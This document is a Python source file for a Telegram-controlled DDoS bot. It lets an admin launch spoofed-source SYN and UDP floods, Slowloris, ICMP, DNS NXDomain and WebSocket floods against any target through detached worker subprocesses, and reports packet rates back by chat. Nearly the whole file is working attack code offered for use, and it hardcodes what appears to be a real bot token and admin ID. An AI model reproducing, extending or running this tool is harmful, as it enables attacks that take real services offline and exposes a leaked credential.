#!/usr/bin/env python3
"""DDOS-Telegram-BOT v3 — subprocess attacks, bot stays responsive."""

import os
import sys
import time
import random
import socket
import struct
import signal
import subprocess
import tempfile
import threading

import telebot
from telebot import types

TOKEN = "8957659231:AAEq8JWsXaKtvZobfubGdNf_3sDUZriMBbo"
ADMIN_CHAT_ID = int(os.environ.get("TG_ADMIN_ID", "8789271943"))

bot = telebot.TeleBot(TOKEN)
user_attacks = {}

PROCS = {}          # key → subprocess.Popen
STATS_FILE = {}     # key → path to stats file
STATE_LOCK = threading.Lock()

ATTACK_METHODS = {
    "1": "SYN Flood",
    "2": "UDP Flood",
    "3": "HTTP Slowloris",
    "4": "ICMP Ping Storm",
    "5": "DNS NXDomain",
    "6": "WebSocket Flood",
}
NAME_TO_ID = {"syn": "1", "udp": "2", "slowloris": "3",
              "icmp": "4", "dns": "5", "ws": "6"}


# ─────────────────────────────────────────────────────────────
# WORKER — runs in subprocess, one method per invocation
# ─────────────────────────────────────────────────────────────
WORKER_CODE = r'''
import os, sys, time, random, socket, struct, signal, subprocess

METHOD = sys.argv[1]
TARGET = sys.argv[2]
PORT = int(sys.argv[3])
THREADS = int(sys.argv[4])
STATS_PATH = sys.argv[5]

STOP = False
def _sig(s, f):
    global STOP
    STOP = True
signal.signal(signal.SIGTERM, _sig)
signal.signal(signal.SIGINT, _sig)

PKTS = 0
LOCK = __import__("threading").Lock()

def bump(n=1):
    global PKTS
    with LOCK:
        PKTS += n

def checksum(d):
    if len(d) % 2: d += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(d)//2), d))
    s = (s >> 16) + (s & 0xFFFF); s += s >> 16
    return ~s & 0xFFFF

def rip():
    while True:
        ip = socket.inet_ntoa(struct.pack("!I", random.getrandbits(32)))
        a, b, _, _ = map(int, ip.split("."))
        if a in (0,10,127): continue
        if a == 172 and 16 <= b <= 31: continue
        if a == 192 and b == 168: continue
        if a == 169 and b == 254: continue
        if a >= 224: continue
        return ip

def iphdr(s, d, p, pl):
    tot = 20 + pl
    h = struct.pack("!BBHHHBBH4s4s", 0x45, 0, tot, random.randint(0,65535), 0, 64, p, 0,
                    socket.inet_aton(s), socket.inet_aton(d))
    c = checksum(h)
    return struct.pack("!BBHHHBBH4s4s", 0x45, 0, tot, random.randint(0,65535), 0, 64, p, c,
                       socket.inet_aton(s), socket.inet_aton(d))

def syn():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("[!] needs root", flush=True); return
    while not STOP:
        tcp = struct.pack("!HHIIBBHHH", random.randint(1024,65535), PORT,
                          random.randint(0,0xFFFFFFFF), 0, (5<<4), 0x02, 64240, 0, 0)
        ip = iphdr(rip(), TARGET, socket.IPPROTO_TCP, len(tcp))
        try:
            sock.sendto(ip+tcp, (TARGET, 0)); bump()
        except OSError: pass

def udp():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("[!] needs root", flush=True); return
    payload = os.urandom(1400)
    while not STOP:
        udp_h = struct.pack("!HHHH", random.randint(1024,65535), PORT, 8+len(payload), 0)
        ip = iphdr(rip(), TARGET, socket.IPPROTO_UDP, 8+len(payload))
        try:
            sock.sendto(ip+udp_h+payload, (TARGET, 0)); bump()
        except OSError: pass

def slowloris():
    uas = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
           "Mozilla/5.0 (X11; Linux x86_64)"]
    while not STOP:
        try:
            s = socket.socket(); s.settimeout(4)
            s.connect((TARGET, PORT))
            s.send(f"GET / HTTP/1.1\r\nHost: {TARGET}\r\n".encode())
            for i in range(30):
                if STOP: break
                s.send(f"X-{i}: {random.choice(uas)}\r\n".encode())
                time.sleep(random.uniform(8, 15))
            bump()
        except Exception: pass

def icmp():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print("[!] needs root", flush=True); return
    payload = os.urandom(1400)
    while not STOP:
        h = struct.pack("!BBHHH", 8, 0, 0, random.randint(0,65535), random.randint(0,65535))
        c = checksum(h+payload)
        h = struct.pack("!BBHHH", 8, 0, c, random.randint(0,65535), random.randint(0,65535))
        try:
            sock.sendto(h+payload, (TARGET, 0)); bump()
        except OSError: pass

def dns():
    while not STOP:
        sub = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=12))
        try:
            socket.gethostbyname(f"{sub}.{TARGET}"); bump()
        except socket.gaierror: bump()
        except Exception: pass

def ws():
    try:
        from websocket import create_connection
    except ImportError:
        print("[!] pip install websocket-client", flush=True); return
    while not STOP:
        try:
            w = create_connection(f"ws://{TARGET}:{PORT}/", timeout=3)
            w.send("0" * 65536); w.close(); bump()
        except Exception: pass

METHODS = {"syn": syn, "udp": udp, "slowloris": slowloris,
           "icmp": icmp, "dns": dns, "ws": ws}

def stats_writer():
    start = time.time()
    while not STOP:
        time.sleep(1)
        try:
            with open(STATS_PATH, "w") as f:
                f.write(f"{PKTS} {start}")
        except Exception: pass

__import__("threading").Thread(target=stats_writer, daemon=True).start()

fn = METHODS.get(METHOD)
if not fn:
    print(f"[!] unknown method: {METHOD}", flush=True); sys.exit(1)

# spin worker threads
worker_threads = []
for _ in range(THREADS):
    t = __import__("threading").Thread(target=fn, daemon=True)
    t.start()
    worker_threads.append(t)

try:
    while not STOP:
        time.sleep(0.5)
except KeyboardInterrupt:
    pass
'''

WORKER_PATH = "/tmp/ddos_worker.py"


def ensure_worker():
    if not os.path.exists(WORKER_PATH) or \
       open(WORKER_PATH).read() != WORKER_CODE:
        with open(WORKER_PATH, "w") as f:
            f.write(WORKER_CODE)
        os.chmod(WORKER_PATH, 0o755)


# ─────────────────────────────────────────────────────────────
def is_valid_ip(s):
    try:
        socket.inet_aton(s); return s.count(".") == 3
    except OSError: return False


def launch(method_id, target_ip, target_port, threads, chat_id):
    method_name = {v: k for k, v in NAME_TO_ID.items()}[method_id]
    key = f"{chat_id}:{method_id}:{target_ip}:{target_port}"

    with STATE_LOCK:
        if key in PROCS:
            return None, "already running"
        stats_path = f"/tmp/ddos_stats_{abs(hash(key))}.txt"
        STATS_FILE[key] = stats_path

    ensure_worker()
    try:
        proc = subprocess.Popen(
            [sys.executable, WORKER_PATH, method_name, target_ip,
             str(target_port or 80), str(threads), stats_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,   # detach from parent's process group
        )
    except Exception as e:
        return None, f"spawn failed: {e}"

    with STATE_LOCK:
        PROCS[key] = proc

    return key, None


def stop_key(key):
    with STATE_LOCK:
        proc = PROCS.pop(key, None)
        path = STATS_FILE.pop(key, None)
    if proc:
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
        except Exception:
            pass
    if path and os.path.exists(path):
        try: os.remove(path)
        except Exception: pass
    return proc is not None


def stop_all():
    with STATE_LOCK:
        keys = list(PROCS.keys())
    for k in keys:
        stop_key(k)
    return keys


def read_stats(key):
    path = STATS_FILE.get(key)
    if not path or not os.path.exists(path):
        return None
    try:
        with open(path) as f:
            parts = f.read().split()
        return int(parts[0]), float(parts[1])
    except Exception:
        return None


# ─────────────────────────────────────────────────────────────
def is_admin(m):
    return m.from_user.id == ADMIN_CHAT_ID


@bot.message_handler(commands=["start"])
def show_attack_menu(message):
    if not is_admin(message):
        bot.reply_to(message, "⛔ unauthorized"); return
    markup = types.InlineKeyboardMarkup(row_width=2)
    for num, desc in ATTACK_METHODS.items():
        markup.add(types.InlineKeyboardButton(f"{num}. {desc}", callback_data=f"attack_{num}"))
    bot.send_message(
        message.chat.id,
        "<b>⚡ CONTROL PANEL ⚡</b>\n"
        "subprocess mode — bot stays responsive\n\n"
        "<code>/attack &lt;method&gt; &lt;host:port&gt; [threads]</code>\n"
        "methods: syn udp slowloris icmp dns ws\n\n"
        "/stop &lt;key&gt;  /stopall  /active",
        parse_mode="HTML", reply_markup=markup,
    )


@bot.callback_query_handler(func=lambda c: c.data.startswith("attack_"))
def set_attack_method(call):
    if call.from_user.id != ADMIN_CHAT_ID:
        bot.answer_callback_query(call.id, "unauthorized", show_alert=True); return
    mid = call.data.split("_", 1)[1]
    user_attacks[call.message.chat.id] = {"method": mid}
    bot.send_message(call.message.chat.id,
                     f"⛔ {ATTACK_METHODS[mid]} SELECTED\nSend target host:port:")
    bot.answer_callback_query(call.id)


@bot.message_handler(commands=["stop"])
def cmd_stop(message):
    if not is_admin(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "usage: /stop <key>"); return
    bot.reply_to(message, "stopped" if stop_key(parts[1].strip()) else "not found")


@bot.message_handler(commands=["stopall"])
def cmd_stopall(message):
    if not is_admin(message): return
    bot.reply_to(message, f"stopped {len(stop_all())}")


@bot.message_handler(commands=["active"])
def cmd_active(message):
    if not is_admin(message): return
    with STATE_LOCK:
        keys = list(PROCS.keys())
    if not keys:
        bot.reply_to(message, "nothing running"); return
    lines = ["<b>Active</b>"]
    now = time.time()
    for k in keys:
        s = read_stats(k)
        if s:
            pkts, start = s
            age = max(0.001, now - start)
            pps = pkts / age
            lines.append(f"<code>{k}</code>\n  pkts={pkts}  age={int(age)}s  pps={int(pps)}")
        else:
            lines.append(f"<code>{k}</code>\n  (no stats yet)")
    bot.send_message(message.chat.id, "\n".join(lines), parse_mode="HTML")


@bot.message_handler(commands=["attack"])
def cmd_attack(message):
    if not is_admin(message): return
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message,
                     "usage: /attack <method> <host:port> [threads]\n"
                     "methods: syn udp slowloris icmp dns ws")
        return

    method_name = parts[1].lower()
    raw_target = parts[2].strip()
    threads = 8
    if len(parts) >= 4:
        try:
            threads = max(1, min(64, int(parts[3])))
        except ValueError: pass

    method_id = NAME_TO_ID.get(method_name)
    if not method_id:
        bot.reply_to(message, f"unknown method: {method_name}"); return

    port = None
    target = raw_target
    if ":" in raw_target:
        host_part, port_part = raw_target.rsplit(":", 1)
        try: port = int(port_part); target = host_part
        except ValueError: pass

    try:
        ip = target if is_valid_ip(target) else socket.gethostbyname(target)
    except Exception as e:
        bot.reply_to(message, f"resolve failed: {e}"); return

    label = ATTACK_METHODS[method_id]
    target_str = f"{ip}:{port}" if port else ip

    bot.send_message(message.chat.id, f"🚀 {label} → {target_str}  th={threads}")
    key, err = launch(method_id, ip, port, threads, message.chat.id)
    if err:
        bot.send_message(message.chat.id, f"error: {err}"); return
    bot.send_message(ADMIN_CHAT_ID,
                     f"☠️ DEPLOYED\n{label}\n{target_str}\nth={threads}\nkey={key}")


@bot.message_handler(func=lambda m: m.chat.id in user_attacks and not m.text.startswith("/"))
def execute_attack(message):
    if not is_admin(message): return
    chat_id = message.chat.id
    raw = message.text.strip()
    try:
        port = None
        target = raw
        if ":" in raw:
            h, p = raw.rsplit(":", 1)
            try: port = int(p); target = h
            except ValueError: pass
        ip = target if is_valid_ip(target) else socket.gethostbyname(target)
        mid = user_attacks[chat_id]["method"]
        label = ATTACK_METHODS[mid]
        tstr = f"{ip}:{port}" if port else ip
        bot.send_message(chat_id, f"🚀 {label} → {tstr}")
        key, err = launch(mid, ip, port, 8, chat_id)
        if err:
            bot.send_message(chat_id, f"error: {err}"); return
        bot.send_message(ADMIN_CHAT_ID,
                         f"☠️ DEPLOYED\n{label}\n{tstr}\nkey={key}")
    except Exception as e:
        bot.send_message(chat_id, f"💥 {e}")


# ─────────────────────────────────────────────────────────────
def cleanup(*_):
    print("[*] shutting down, killing attacks...")
    stop_all()
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)


if __name__ == "__main__":
    if TOKEN in ("PASTE_NEW_TOKEN", "", None):
        print("[!] set TOKEN"); sys.exit(1)
    if os.geteuid() != 0:
        print("[!] WARNING: not root — raw methods fail")
    ensure_worker()
    print("DDOS-BOT v3 (subprocess mode)")
    print(f"worker: {WORKER_PATH}")
    bot.infinity_polling(timeout=30, long_polling_timeout=25)
